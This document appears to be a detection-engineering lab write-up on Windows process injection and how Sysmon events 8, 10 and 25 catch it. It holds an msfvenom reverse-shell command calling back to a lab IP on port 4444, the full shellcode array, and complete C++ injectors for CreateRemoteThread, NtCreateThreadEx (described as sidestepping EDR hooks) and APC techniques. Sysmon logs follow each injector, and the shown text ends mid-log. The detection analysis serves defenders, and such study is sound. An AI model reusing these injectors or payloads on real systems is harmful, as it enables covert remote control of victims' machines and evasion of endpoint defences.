# Process injection techniques with Sysmon analysis
What each Sysmon Event ID catches:
- Event ID 8 CreateRemoteThread: Fires when a thread is created in another process. Catches: classic CRT, NtCreateThreadEx (sometimes), RtlCreateUserThread. Does NOT fire for APC injection since no thread is created instead an existing thread is targeted.
- Event ID 10 ProcessAccess: Fires when a process opens a handle to another process with specific access rights (PROCESS_VM_WRITE, PROCESS_VM_READ, PROCESS_CREATE_THREAD). Virtually every injection technique requires a handle to the target process.
- Event ID 25 ProcessTampering: Fires specifically on image replacement or process hollowing when the mapped image in memory no longer matches the file on disk. Catches: hollowing, module stomping, some reflective DLL variants.
<img width="942" height="712" alt="image" src="https://github.com/user-attachments/assets/65977293-a5d1-43cc-8dab-a8c0f33aa17d" />

## Process Access Rights
On Windows 11, when injecting into a process owned by the same user in the same session, the kernel automatically promotes the granted access mask to PROCESS_ALL_ACCESS (0x1fffff) regardless of what the caller requested. So even with minimum rights in exploit, Sysmon logged 0x1fffff.
| Value    | Breakdown                                           | Technique / Context                        |
|----------|-----------------------------------------------------|--------------------------------------------|
| 0x1fffff | PROCESS_ALL_ACCESS                                  | Lazy injectors, lab code, commodity malware|
| 0x143a   | VM_WRITE+VM_OP+CREATE_THREAD+QUERY                  | Classic CRT injection minimum              |
| 0x1410   | VM_WRITE+VM_READ+VM_OP                              | Memory write, no thread creation           |
| 0x1010   | VM_READ+QUERY_LIMITED                               | Reconnaissance, credential dumping         |
| 0x0040   | DUP_HANDLE                                          | Handle duplication attacks                 |
| 0x0800   | SUSPEND_RESUME                                      | Thread hijacking, context manipulation     |
| 0x0010   | VM_READ only                                        | Memory scraping, credential theft          |
| 0x0020   | VM_WRITE only                                       | Targeted memory patch                      |
| 0x0400   | QUERY_INFORMATION only                              | Process reconnaissance                     |
| 0x1000   | QUERY_LIMITED_INFORMATION                           | Stealthy enumeration                       |
| 0x047a   | VM_WRITE+VM_OP+CREATE_THREAD+DUP_HANDLE             | Injection with handle duplication          |
| 0x1f0fff | ALL_ACCESS older Windows builds                     | Pre-Win8 PROCESS_ALL_ACCESS variant        |
| 0x1f3fff | ALL_ACCESS alternate                                | Seen in older Metasploit modules           |
| 0x0478   | VM_WRITE+VM_OP+DUP_HANDLE+QUERY                     | No thread creation — APC or hijack path    |
| 0x1438   | VM_WRITE+VM_OP+SUSPEND_RESUME+QUERY                 | Thread hijacking injection                 |
| 0x0002   | CREATE_THREAD only                                  | Thread creation in already-written memory  |
| 0x0008   | VM_OPERATION only                                   | VirtualProtect changes, no write           |
| 0x101a   | VM_WRITE+VM_OP+VM_READ+QUERY_LIMITED                | Reflective DLL injection pattern           |
| 0x147a   | VM_WRITE+VM_OP+CREATE_THREAD+DUP+QUERY+SUSPEND      | Full injection with suspend capability     |


## Sysmon CallTrace explained
CallTrace reads right to left with the rightmost entry is where execution started. UNKNOWN in calltrace means the code at that address has no associated PE module with raw code executing from VirtualAllocEx allocated memory and most often shellcode. All executables compiled with MinGW which show some KERNEL32 CRT noise in init. 

| CallTrace Origin          | Meaning                        | Suspicion  |
|---------------------------|--------------------------------|------------|
| app.exe+offset            | Named PE module                | Normal     |
| ntdll.dll+offset          | Thread startup boilerplate     | Normal     |
| KERNELBASE.dll+offset     | Windows API routing            | Normal     |
| UNKNOWN(address)          | Anonymous memory               | High       |

| CallTrace Pattern                         | Technique              |
|-------------------------------------------|------------------------|
| ntdll ← KERNELBASE ← KERNEL32 ← app.exe   | Normal Win32 API       |
| ntdll ← KERNELBASE ← app.exe              | Native API (ntdll)     |
| ntdll ← app.exe                           | Direct Syscall         |
| ntdll ← KERNELBASE ← KERNEL32 ← UNKNOWN   | Shellcode post-inject  |


## Lab setup
1. Windows Host running ELK in WSL with local FW rules to push traffic to the host -> WSL
2. Windows VM with Elastic Agent, Sysmon and sysmonconfig-olaf-filedelete.xml on bridged network
3. Kali VM as attacking machine on bridged network


## Init common header with shellcode
On Kali run:
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.32.49 LPORT=4444 -f c -b \x00\x0a\x0d
- nc -lvnp 4444


Then common header used for each exploit
```
#pragma once
#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdint.h>


unsigned char shellcode[] = 
"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
"\xff\xff\xff\x48\xbb\xf8\xd1\x23\xeb\xbe\xe7\xfa\x58\x48"
"\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x04\x99\xa0"
"\x0f\x4e\x0f\x3a\x58\xf8\xd1\x62\xba\xff\xb7\xa8\x09\xae"
"\x99\x12\x39\xdb\xaf\x71\x0a\x98\x99\xa8\xb9\xa6\xaf\x71"
"\x0a\xd8\x99\xa8\x99\xee\xaf\xf5\xef\xb2\x9b\x6e\xda\x77"
"\xaf\xcb\x98\x54\xed\x42\x97\xbc\xcb\xda\x19\x39\x18\x2e"
"\xaa\xbf\x26\x18\xb5\xaa\x90\x72\xa3\x35\xb5\xda\xd3\xba"
"\xed\x6b\xea\x6e\x6c\x7a\xd0\xf8\xd1\x23\xa3\x3b\x27\x8e"
"\x3f\xb0\xd0\xf3\xbb\x35\xaf\xe2\x1c\x73\x91\x03\xa2\xbf"
"\x37\x19\x0e\xb0\x2e\xea\xaa\x35\xd3\x72\x10\xf9\x07\x6e"
"\xda\x77\xaf\xcb\x98\x54\x90\xe2\x22\xb3\xa6\xfb\x99\xc0"
"\x31\x56\x1a\xf2\xe4\xb6\x7c\xf0\x94\x1a\x3a\xcb\x3f\xa2"
"\x1c\x73\x91\x07\xa2\xbf\x37\x9c\x19\x73\xdd\x6b\xaf\x35"
"\xa7\xe6\x11\xf9\x01\x62\x60\xba\x6f\xb2\x59\x28\x90\x7b"
"\xaa\xe6\xb9\xa3\x02\xb9\x89\x62\xb2\xff\xbd\xb2\xdb\x14"
"\xf1\x62\xb9\x41\x07\xa2\x19\xa1\x8b\x6b\x60\xac\x0e\xad"
"\xa7\x07\x2e\x7e\xa2\x00\x90\x89\x6a\xa7\xe2\x11\xeb\xbe"
"\xa6\xac\x11\x71\x37\x6b\x6a\x52\x47\xfb\x58\xf8\x98\xaa"
"\x0e\xf7\x5b\xf8\x58\xe9\x8d\xe3\x43\x9e\xd6\xbb\x0c\xb1"
"\x58\xc7\xa7\x37\x16\xbb\xe2\xb4\xa6\x05\xec\x41\x32\xb6"
"\xd1\x12\xb9\x22\xea\xbe\xe7\xa3\x19\x42\xf8\xa3\x80\xbe"
"\x18\x2f\x08\xa8\x9c\x12\x22\xf3\xd6\x3a\x10\x07\x11\x6b"
"\x62\x7c\xaf\x05\x98\xb0\x58\xe2\xaa\x04\x0d\xf5\x87\x18"
"\x2e\xf6\xa3\x37\x20\x90\x48\xb9\x89\x6f\x62\x5c\xaf\x73"
"\xa1\xb9\x6b\xba\x4e\xca\x86\x05\x8d\xb0\x50\xe7\xab\xbc"
"\xe7\xfa\x11\x40\xb2\x4e\x8f\xbe\xe7\xfa\x58\xf8\x90\x73"
"\xaa\xee\xaf\x73\xba\xaf\x86\x74\xa6\x8f\x27\x90\x55\xa1"
"\x90\x73\x09\x42\x81\x3d\x1c\xdc\x85\x22\xea\xf6\x6a\xbe"
"\x7c\xe0\x17\x23\x83\xf6\x6e\x1c\x0e\xa8\x90\x73\xaa\xee"
"\xa6\xaa\x11\x07\x11\x62\xbb\xf7\x18\x32\x15\x71\x10\x6f"
"\x62\x7f\xa6\x40\x21\x34\xee\xa5\x14\x6b\xaf\xcb\x8a\xb0"
"\x2e\xe9\x60\xb0\xa6\x40\x50\x7f\xcc\x43\x14\x6b\x5c\x0a"
"\xed\x5a\x87\x62\x51\x18\x72\x47\xc5\x07\x04\x6b\x68\x7a"
"\xcf\xc6\x5e\x84\xdb\xa3\x10\x5e\x92\xff\xe3\xbf\xc2\x51"
"\x84\xd4\xe7\xa3\x19\x71\x0b\xdc\x3e\xbe\xe7\xfa\x58";

SIZE_T shellcode_size = sizeof(shellcode);

// Helper: find PID by process name
DWORD GetPID(const wchar_t* procName) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, procName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}
```

## T1. Classic CreateRemoteThread
Opens a handle to a running process, writes shellcode into its memory space,
then creates a new thread inside that process to execute it. All through
documented Win32 API calls in kernel32.dll. Most well-known injection
technique.

The four API calls and what Sysmon sees at each step:
| API Call               | Layer   | Sysmon Event |
|------------------------|---------|--------------|
| OpenProcess()          | Win32   | EID 10       |
| VirtualAllocEx()       | Win32   | -            |
| WriteProcessMemory()   | Win32   | -            |
| CreateRemoteThread()   | Win32   | EID 8        |

```
// t1_classic_crt_minimal.cpp
#include "common.h"

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // Minimum rights for CRT injection
    HANDLE hProc = OpenProcess(
        PROCESS_VM_WRITE          |   // WriteProcessMemory
        PROCESS_VM_OPERATION      |   // VirtualAllocEx
        PROCESS_CREATE_THREAD     |   // CreateRemoteThread
        PROCESS_QUERY_INFORMATION,    // GetExitCodeThread
        FALSE, pid
    );
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Handle acquired — requested 0x143a\n");

    LPVOID remoteMem = VirtualAllocEx(
        hProc, NULL, shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remoteMem) {
        wprintf(L"[-] VirtualAllocEx failed\n");
        return 1;
    }
    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
        wprintf(L"[-] WriteProcessMemory failed\n");
        return 1;
    }
    wprintf(L"[+] Shellcode written: %zu bytes\n", written);

    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL, 0, NULL
    );
    if (!hThread) {
        wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Remote thread created\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

### Sysmon Data
1. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
UtcTime: 2026-05-12 11:15:16.217
SourceProcessGUID: {ED9BFE1B-0BC3-6A03-8E06-000000000A00}
SourceProcessId: 5856
SourceThreadId: 5232
SourceImage: C:\Users\jens\Documents\procInj\t1_classic_crt.exe
TargetProcessGUID: {ED9BFE1B-0B95-6A03-8D06-000000000A00}
TargetProcessId: 7524
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+161fc4|C:\WINDOWS\System32\KERNELBASE.dll+42e76|C:\Users\jens\Documents\procInj\t1_classic_crt.exe+15d5|C:\Users\jens\Documents\procInj\t1_classic_crt.exe+10d9|C:\Users\jens\Documents\procInj\t1_classic_crt.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e8d7|C:\WINDOWS\SYSTEM32\ntdll.dll+8c3fc
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-12 11:15:16.217
SourceProcessGuid: {ED9BFE1B-0BC3-6A03-8E06-000000000A00}
SourceProcessId: 5856
SourceImage: C:\Users\jens\Documents\procInj\t1_classic_crt.exe
TargetProcessGuid: {ED9BFE1B-0B95-6A03-8D06-000000000A00}
TargetProcessId: 7524
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 13228
StartAddress: 0x000002ED1B650000
StartModule: -
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-12 11:15:16.502
ProcessGuid: {ED9BFE1B-0BC4-6A03-9206-000000000A00}
ProcessId: 10416
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-E11B-6A02-743F-0B0000000000}
LogonId: 0xb3f74
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=2EDE04B00B744D0D2D5614E83997022CC3EF3656,MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-0B95-6A03-8D06-000000000A00}
ParentProcessId: 7524
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" RestartByRestartManager:* 
ParentUser: WIN11\jens"

4. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-12 11:15:16.546
SourceProcessGUID: {ED9BFE1B-0B95-6A03-8D06-000000000A00}
SourceProcessId: 7524
SourceThreadId: 13228
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-0BC4-6A03-9206-000000000A00}
TargetProcessId: 10416
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae153|C:\WINDOWS\System32\KERNELBASE.dll+adcb6|C:\WINDOWS\System32\KERNEL32.DLL+44fd4|UNKNOWN(000002ED1B6501BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

5. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-12 11:15:22.115
ProcessGuid: {ED9BFE1B-0B95-6A03-8D06-000000000A00}
ProcessId: 7524
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.39
SourceHostname: -
SourcePort: 56719
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"

### SYSMON analysis
Had to add in ProcessAcess onmatch=include with GrantedAccess value 0x1FFFFF to catch event 1. Added ProcessInjectionDelux to cover all types of binary codes (  0x1FFFFF;0x1F0FFF;0x1F1FFF;0x1F2FFF;0x1F3FFF;0x143A;0x147A;0x047A;0x1410;0x1438;0x0478;0x1010;0x1410). Also csrss.exe opens handles to every process that starts or exits on the system so could need to exclude for less noise.

| Step | Action                                | Sysmon EID | Rule Triggered          |
|------|---------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad      | EID 10     | ProcessInjectionDelux   |
| 2    | Shellcode written to remote memory    | -          | -                       |
| 3    | CreateRemoteThread creates thread     | EID 8      | T1055 Process Injection |
| 4    | Shellcode opens handle to cmd.exe     | EID 10     | ProcessInjectionDelux   |
| 5    | Notepad spawns cmd.exe                | EID 1      | T1059.003 Cmd Shell     |
| 6    | Notepad beacons to C2                 | EID 3      | T1571 Non-Standard Port |

### Key Indicators
- **EID 8** `StartModule: -` thread starts from anonymous memory, not a
  named module. Strongest single indicator of shellcode execution.
- **EID 10** `GrantedAccess: 0x1fffff` PROCESS_ALL_ACCESS handle open.
  Caught by ProcessInjectionDelux rule.
- **EID 10** `CallTrace: UNKNOWN(address)` shellcode calling Win32 APIs
  from anonymous memory. Legitimate code always has a named module in trace.


## T2. Direct Native API
Calls NtCreateThreadEx directly from ntdll.dll instead of going through CreateRemoteThread in kernel32.dll. Internally, CreateRemoteThread is just a wrapper that eventually calls NtCreateThreadEx so the kernel sees the same event. EDRs typically place hooks at the top of each function in kernel32.dll and ntdll.dll. By skipping kernel32.dll entirely you bypass any hook placed on CreateRemoteThread. Sysmon sits in the kernel and should catch the threat creation event regardless.
| API Call            | Layer      | Sysmon Event |
|---------------------|------------|--------------|
| OpenProcess()       | Win32      | EID 10       |
| VirtualAllocEx()    | Win32      | -            |
| WriteProcessMemory()| Win32      | -            |
| NtCreateThreadEx()  | Native API | EID 8        |

```
// t2_ntcreatethreadex.cpp
#include "common.h"

typedef NTSTATUS(WINAPI* pNtCreateThreadEx)(
    PHANDLE             hThread,
    ACCESS_MASK         DesiredAccess,
    LPVOID              ObjectAttributes,
    HANDLE              ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID              lpParameter,
    ULONG               Flags,
    SIZE_T              StackZeroBits,
    SIZE_T              SizeOfStackCommit,
    SIZE_T              SizeOfStackReserve,
    LPVOID              lpBytesBuffer
);

int main() {
    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // Minimum rights for NtCreateThreadEx injection
    HANDLE hProc = OpenProcess(
        PROCESS_VM_WRITE          |   // WriteProcessMemory
        PROCESS_VM_OPERATION      |   // VirtualAllocEx
        PROCESS_CREATE_THREAD     |   // NtCreateThreadEx
        PROCESS_QUERY_INFORMATION,    // NtQueryInformationProcess
        FALSE, pid
    );
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Handle acquired — requested 0x143a\n");

    LPVOID remoteMem = VirtualAllocEx(
        hProc, NULL, shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!remoteMem) {
        wprintf(L"[-] VirtualAllocEx failed\n");
        return 1;
    }
    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteMem, shellcode, shellcode_size, &written)) {
        wprintf(L"[-] WriteProcessMemory failed\n");
        return 1;
    }
    wprintf(L"[+] Shellcode written: %zu bytes\n", written);

    // Resolve NtCreateThreadEx directly from ntdll
    // bypassing kernel32.dll entirely
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(
        ntdll, "NtCreateThreadEx"
    );
    if (!NtCreateThreadEx) {
        wprintf(L"[-] Failed to resolve NtCreateThreadEx\n");
        return 1;
    }
    wprintf(L"[+] NtCreateThreadEx resolved at: 0x%p\n", NtCreateThreadEx);

    HANDLE hThread = NULL;
    NTSTATUS status = NtCreateThreadEx(
        &hThread,
        GENERIC_EXECUTE,
        NULL,
        hProc,
        (LPTHREAD_START_ROUTINE)remoteMem,
        NULL,
        0,
        0, 0, 0,
        NULL
    );

    wprintf(L"[+] NtCreateThreadEx status: 0x%08X\n", status);
    if (!hThread) {
        wprintf(L"[-] Thread creation failed\n");
        return 1;
    }
    wprintf(L"[+] Remote thread created — requested 0x143a\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
```

### Sysmon Data
1. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
UtcTime: 2026-05-12 14:00:07.843
SourceProcessGUID: {ED9BFE1B-3266-6A03-B907-000000000A00}
SourceProcessId: 3628
SourceThreadId: 10800
SourceImage: C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe
TargetProcessGUID: {ED9BFE1B-3204-6A03-AD07-000000000A00}
TargetProcessId: 6512
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+161fc4|C:\WINDOWS\System32\KERNELBASE.dll+42e76|C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe+15d8|C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe+10d9|C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e8d7|C:\WINDOWS\SYSTEM32\ntdll.dll+8c3fc
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "CreateRemoteThread detected:
RuleName: technique_id=T1055,technique_name=Process Injection
UtcTime: 2026-05-12 14:00:07.859
SourceProcessGuid: {ED9BFE1B-3266-6A03-B907-000000000A00}
SourceProcessId: 3628
SourceImage: C:\Users\jens\Documents\procInj\t2_ntcreatethreadex.exe
TargetProcessGuid: {ED9BFE1B-3204-6A03-AD07-000000000A00}
TargetProcessId: 6512
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
NewThreadId: 6484
StartAddress: 0x000001A1101C0000
StartModule: -
StartFunction: -
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

3. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-12 14:00:08.433
ProcessGuid: {ED9BFE1B-3268-6A03-BD07-000000000A00}
ProcessId: 12136
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
CurrentDirectory: C:\Users\jens\
User: WIN11\jens
LogonGuid: {ED9BFE1B-E11B-6A02-743F-0B0000000000}
LogonId: 0xb3f74
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=2EDE04B00B744D0D2D5614E83997022CC3EF3656,MD5=77F0062F490BCC7023763A422E561945,SHA256=14CC8AB1DCF0D9F19E8FB82DEB547CF8C462C56A0E43F7ADDC02641AB3C81651,IMPHASH=B0F049C014592B156EB1FA857E99CEB9
ParentProcessGuid: {ED9BFE1B-3204-6A03-AD07-000000000A00}
ParentProcessId: 6512
ParentImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
ParentCommandLine: ""C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe"" 
ParentUser: WIN11\jens"

4. "Process accessed:
RuleName: technique_id=T1055.001,technique_name=Dynamic-link Library Injection
UtcTime: 2026-05-12 14:00:08.573
SourceProcessGUID: {ED9BFE1B-3204-6A03-AD07-000000000A00}
SourceProcessId: 6512
SourceThreadId: 6484
SourceImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
TargetProcessGUID: {ED9BFE1B-3268-6A03-BD07-000000000A00}
TargetProcessId: 12136
TargetImage: C:\WINDOWS\system32\cmd.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae153|C:\WINDOWS\System32\KERNELBASE.dll+adcb6|C:\WINDOWS\System32\KERNEL32.DLL+44fd4|UNKNOWN(000001A1101C01BC)
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

5. "Network connection detected:
RuleName: technique_id=T1571,technique_name=Non-Standard Port
UtcTime: 2026-05-12 14:00:10.572
ProcessGuid: {ED9BFE1B-3204-6A03-AD07-000000000A00}
ProcessId: 6512
Image: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
User: WIN11\jens
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 192.168.32.39
SourceHostname: -
SourcePort: 49278
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 192.168.32.49
DestinationHostname: -
DestinationPort: 4444
DestinationPortName: -"


### Sysmon Analysis
| Step | Action                               | Sysmon EID | Rule Triggered          |
|------|--------------------------------------|------------|-------------------------|
| 1    | Injector opens handle to Notepad     | EID 10     | ProcessInjectionDelux   |
| 2    | Shellcode written to remote memory   | -          | -                       |
| 3    | NtCreateThreadEx creates thread      | EID 8      | T1055 Process Injection |
| 4    | Shellcode opens handle to cmd.exe    | EID 10     | ProcessInjectionDelux   |
| 5    | Notepad spawns cmd.exe               | EID 1      | T1059.003 Cmd Shell     |
| 6    | Notepad beacons to C2                | EID 3      | T1571 Non-Standard Port |

### Key Indicators
- **EID 10** `CallTrace: t2_ntcreatethreadex.exe+15d8` injector binary
  visible in call trace. Clean chain through ntdll and KERNELBASE into
  the injector with no UNKNOWN modules at this stage.
- **EID 8** `StartModule: -` thread starts from anonymous memory.
- **EID 10** `SourceThreadId: 6484` matches `NewThreadId: 6484` from
  EID 8 the injected thread is the one making subsequent API calls. Direct forensic link between thread creation and post-injection activity.


## T3. APC Queue Code Injection
Threads can execute code asynchronously by leveraging APC queues. It queues a function call to an existing thread in the target process rather than creating a new thread. For APC to execute the target thread must enter an alertable wait state via SleepEx, WaitForSingleObjectEx or similar and cannot force the victim thread to execute the injected code. This variant creates the target process suspended, queues the APC before any user code runs, then resumes. The main thread is alertable by default during initialisation.

| API Call            | Layer      | Sysmon Event |
|---------------------|------------|--------------|
| OpenProcess()       | Win32      | EID 10       |
| VirtualAllocEx()    | Win32      | -            |
| WriteProcessMemory()| Win32      | -            |
| OpenThread()        | Win32      | -            |
| QueueUserAPC()      | Win32      | -            |

```
// t3_apc_injection.cpp
#include "common.h"

int main() {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    // Create suspended — thread alertable during init
    if (!CreateProcessW(
        L"C:\\Windows\\System32\\notepad.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &si, &pi)) {
        wprintf(L"[-] CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[*] Created suspended PID: %lu TID: %lu\n",
            pi.dwProcessId, pi.dwThreadId);

    // Allocate and write shellcode
    LPVOID remoteMem = VirtualAllocEx(
        pi.hProcess, NULL, shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcode_size, &written);
    wprintf(L"[+] Shellcode written: %zu bytes at 0x%p\n", written, remoteMem);

    // Queue APC to the main thread before it runs
    // Thread is alertable during early initialization
    DWORD result = QueueUserAPC(
        (PAPCFUNC)remoteMem,
        pi.hThread,
        NULL
    );
    wprintf(L"[+] APC queued: %lu\n", result);

    // Resume — thread executes APC before anything else
    ResumeThread(pi.hThread);
    wprintf(L"[*] Thread resumed — APC executes during init\n");

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
```

### Sysmon Data
1."Process accessed:
RuleName: technique_id=T1055.001,technique_name=ProcessInjectionDelux
UtcTime: 2026-05-13 08:36:47.379
SourceProcessGUID: {ED9BFE1B-381E-6A04-C402-000000000C00}
SourceProcessId: 10708
SourceThreadId: 3400
SourceImage: C:\Users\jens\Documents\procInj\t3_apc_injection.exe
TargetProcessGUID: {ED9BFE1B-381F-6A04-C702-000000000C00}
TargetProcessId: 3380
TargetImage: C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2512.29.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe
GrantedAccess: 0x1fffff
CallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+163514|C:\WINDOWS\System32\KERNELBASE.dll+b0c3a|C:\WINDOWS\System32\KERNELBASE.dll+ae296|C:\WINDOWS\System32\KERNEL32.DLL+3c6e4|C:\Users\jens\Documents\procInj\t3_apc_injection.exe+1601|C:\Users\jens\Documents\procInj\t3_apc_injection.exe+10d9|C:\Users\jens\Documents\procInj\t3_apc_injection.exe+1456|C:\WINDOWS\System32\KERNEL32.DLL+2e8d7|C:\WINDOWS\SYSTEM32\ntdll.dll+8c3fc
SourceUser: WIN11\jens
TargetUser: WIN11\jens"

2. "Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2026-05-13 08:36:47.815
ProcessGuid: {ED9BFE1B-381F-6A04-C802-000000000C00}
ProcessId: 11436
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.8115 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd
